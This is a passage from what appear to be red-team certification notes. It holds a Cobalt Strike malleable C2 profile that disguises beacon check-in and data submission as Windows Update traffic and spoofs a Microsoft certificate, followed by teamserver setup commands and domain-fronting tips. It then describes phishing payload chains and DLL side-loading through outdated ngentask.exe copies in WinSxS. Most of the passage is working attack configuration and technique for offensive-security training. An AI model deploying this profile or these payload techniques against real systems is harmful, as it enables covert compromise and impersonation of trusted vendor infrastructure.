        CreateThread "ntdll!RtlUserThreadStart+0x1000";  # Offset avoids entry point heuristics
        NtQueueApcThread-s;                              # Early-bird APC — executes before main thread runs
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

4.10.4 HTTP-GET Block — Task Check-in

Shapes Beacon's check-in traffic to resemble Windows Update cabinet file requests.

http-get {
    set uri "/v10/windowsupdate/redir/wuredir.cab /updates/v6/windowsupdate/selfupdate/AU/x86/win/0 /windowsupdate/v6/vistadefault.aspx";
    set verb "GET";

    client {
        header "Accept"                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language"           "en-US,en;q=0.5";
        header "Accept-Encoding"           "gzip, deflate, br";
        header "Connection"                "keep-alive";
        header "Upgrade-Insecure-Requests" "1";
        header "Cache-Control"             "no-cache";
        header "Pragma"                    "no-cache";

        metadata {
            base64url;
            prepend "MUID=";    # Microsoft Update client ID format
            header "Cookie";
        }
    }

    server {
        header "Content-Type"           "application/octet-stream";
        header "Content-Disposition"    "attachment; filename=wuredirca.cab";
        header "X-Content-Type-Options" "nosniff";
        header "Cache-Control"          "no-cache, no-store";
        header "Server"                 "Microsoft-IIS/10.0";
        header "X-Powered-By"           "ASP.NET";

        output {
            base64url;
            print;
        }
    }
}

4.10.5 HTTP-POST Block — Result Submission

http-post {
    set uri  "/v10/windowsupdate/selfupdate /windowsupdate/v6/clientdiagnostics";
    set verb "POST";

    client {
        header "Content-Type"    "application/x-www-form-urlencoded";
        header "Accept"          "application/json, text/plain, */*";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Connection"      "keep-alive";
        header "Cache-Control"   "no-cache";

        id {
            base64url;
            prepend "ClientId=";
            uri-append;
        }

        output {
            base64url;
            print;
        }
    }

    server {
        header "Content-Type"  "application/json";
        header "Server"        "Microsoft-IIS/10.0";
        header "X-Powered-By"  "ASP.NET";
        header "Cache-Control" "no-cache, no-store";

        output {
            base64url;
            print;
        }
    }
}

4.10.6 HTTPS Certificate Block

For production engagements, replace this with a valid Let's Encrypt certificate on a domain with a plausible Microsoft-adjacent name. The self-signed cert below is for lab use only.

https-certificate {
    set CN       "update.microsoft.com";
    set O        "Microsoft Corporation";
    set C        "US";
    set ST       "Washington";
    set L        "Redmond";
    set validity "365";
    set keysize  "4096";
}

4.10.7 DNS Beacon Options

dns-beacon {
    set dns_idle  "8.8.4.4";  # Idle check-in resolves to Google DNS — blends with normal traffic
    set dns_sleep "0";
    set maxdns    "255";
    set dns_ttl   "5";
}

4.10.8 Profile Validation & Deployment

# Validate the profile before loading
./c2lint my_profile.c2

# Load at team server startup
./teamserver [IP] [password] [profile.c2]

# Test Beacon traffic with Wireshark — filter for the URIs above
# and verify no Cobalt Strike default headers appear
  • Run c2lint on every profile change — a malformed profile crashes the team server
  • The sleep_mask option requires a Beacon rebuild with each profile change
  • Module stomping target (xpsservices.dll) must be present on the target OS — verify before an engagement
  • For domain-fronting, set the HTTP host header to a CDN-frontable domain and point HTTP Hosts to your team server IP

5. Initial Access

Getting a foothold is usually the noisiest part of the operation. Initial Access [TA0001] is gained by exploiting public-facing services, supply-chain compromise, or — most commonly — phishing. This chapter covers phishing payload construction and delivery for CRTO.

Phishing Taxonomy

Mariusz Banach proposes a taxonomy for phishing payloads represented as DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY)):

  • Delivery — how the package reaches the victim (email, web link, USB)
  • Container — the outer file format (ISO, ZIP, WIM)
  • Trigger — the file the user interacts with (LNK, BAT, MSC)
  • Payload — the malicious code executed
  • Decoy — the content shown post-interaction to lower suspicion

Real infection chains stack multiple stages to defeat automated detection and slow analyst triage. A typical chain: LNK disguised as PDF → mshta downloads obfuscated JS → PowerShell downloads and executes the final payload. The days of sending report.exe directly are long gone.

5.1 Payloads

The payload is the malicious code; the decoy is the content shown to the user post-interaction. The decoy should match the social engineering pretext — a trigger disguised as a PDF should open a PDF.

5.1.1 DLL side-loading

DLL hijacking forces a legitimate application to load a malicious DLL by abusing the Windows DLL search order. Hijack opportunities are typically found by filtering Process Monitor for NAME NOT FOUND results on DLLs that the target loads — every miss is a potential plant.

The classic hijack drops a malicious DLL of the expected name into any user-writable location earlier in the search order.

The Windows Component Store (C:\Windows\WinSxS) keeps multiple versions of the same DLL side-by-side to prevent conflicts. Old versions persist after updates, meaning patched applications often still have vulnerable DLL versions available on disk — prime side-loading targets.

Consider ngentask.exe. The current version in C:\Windows\Microsoft.NET\Framework64 searches only its own directory and the Global Assembly Cache (GAC) for missing dependencies. Older versions in WinSxS behave differently:

PS C:\Users\Attacker> ls -Path C:\Windows\WinSxS -Recurse -Filter ngentask.exe | Select -expand FullName

C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db
gentask.exe
C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.285_none_cbd46ba524299690
gentask.exe
C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15840.3_none_d3fea185692c10e1
gentask.exe
C:\Windows\WinSxS\x86_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_1bb0d4ac7da3bfe1
gentask.exe
C:\Windows\WinSxS\x86_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.285_none_1381a27c38a5bf96
gentask.exe
C:\Windows\WinSxS\x86_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15840.3_none_1babd85c7da839e7
gentask.exe

Running each version under ProcMon shows the difference — the older ones search the CWD before the GAC, making the CWD the easiest hijack point. Drop a malicious mscorsvc.dll there and rerun. Use a custom DLL or a published template like FuzzySecurity's DLL-Template.

5.1.2 AppDomainManager
